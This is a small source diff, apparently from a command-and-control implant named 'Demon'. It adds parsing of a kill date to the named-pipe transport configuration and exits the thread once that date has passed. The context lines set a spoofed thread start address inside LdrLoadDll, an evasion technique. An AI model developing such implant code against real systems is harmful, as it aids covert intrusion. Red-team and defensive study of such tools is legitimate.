@@ -1026,6 +1026,15 @@ VOID DemonConfig()
 
     PRINTF( "[CONFIG] PipeName: %ls\n", Instance.Config.Transport.Name );
 
+    Instance.Config.Transport.KillDate = ParserGetInt64( &Parser );
+    PRINTF( "KillDate: %d\n", Instance.Config.Transport.KillDate )
+    // check if the kill date has already passed
+    if ( Instance.Config.Transport.KillDate && GetSystemTimeAsUnixTime() >= Instance.Config.Transport.KillDate )
+    {
+        // refuse to run
+        // TODO: exit process?
+        Instance.Win32.RtlExitUserThread(0);
+    }
 #endif
 
     Instance.Config.Implant.ThreadStartAddr = Instance.Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
